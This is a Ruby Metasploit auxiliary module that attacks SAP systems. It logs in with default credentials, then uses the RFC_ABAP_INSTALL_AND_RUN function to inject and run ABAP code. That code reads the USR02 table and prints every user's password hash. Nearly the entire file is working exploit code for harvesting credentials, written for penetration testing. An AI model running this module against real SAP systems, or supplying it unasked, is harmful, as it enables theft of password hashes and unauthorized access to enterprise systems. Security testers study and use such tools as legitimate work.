##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'SAP RFC Extract USR02 Hashes',
      'Description'    => %q{
        This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to extract SAP user hashes from USR02.
        RFC_ABAP_INSTALL_AND_RUN takes ABAP source lines and executes them. It is common for the the function to be disabled or access revoked in a production system. It is also deprecated.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => [ 'nmonkee' ],
      'License'        => BSD_LICENSE
       )

    register_options(
      [
        Opt::RPORT(3342),
        OptString.new('USER', [true, 'Username', 'SAP*']),
        OptString.new('PASS', [true, 'Password', '06071992']),
      ], self.class)
  end

  def run_host(rhost)
    user = datastore['USER']
    pass = datastore['PASS']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end
    exec_USR02(user,client,pass,rhost,datastore['rport'])
  end

  def exec_USR02(user, client, pass, rhost, rport)
    begin
      conn = login(rhost, rport, client, user, pass)
      conn.connection_info
      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
      fc = function.get_function_call

code = <<ABAPCODE
REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.
DATA: MANDT(3), BNAME(12), BCODE TYPE XUCODE, PASSC TYPE PWD_SHA1.
EXEC SQL PERFORMING loop_output.
  SELECT MANDT, BNAME, BCODE, PASSCODE INTO :MANDT, :BNAME, :BCODE, :PASSC
  FROM USR02
ENDEXEC.
FORM loop_output.
  WRITE: / MANDT, BNAME, BCODE, PASSC.
ENDFORM.
ABAPCODE

      code.each do |line|
        fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
      end

      begin
        fc.invoke

        saptbl = Msf::Ui::Console::Table.new(
                  Msf::Ui::Console::Table::Style::Default,
                    'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
                    'Columns' =>
                              [
                                "MANDT",
                                "Username",
                                "BCODE",
                                "PASSCODE"
                              ])

        fc[:WRITES].each do |row|
          string = ""
          array = row[:ZEILE].split(/ /)
          array_length = array.size
            for i in 0...array_length
              if array[i] == ""
              else
                string << ",#{array[i]}"
              end
            end
            str_array = string.split(/,/)
            saptbl << [ str_array[1], str_array[2], str_array[3], str_array[4] ]
        end

        print(saptbl.to_s)
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] FunctionCallException code: #{e.code} message: #{e.message}")
      end
    rescue NWError => e
      # An exception shouldn't stop the scanner...
    ensure
      if conn
        conn.disconnect
      end
    end
  end
end

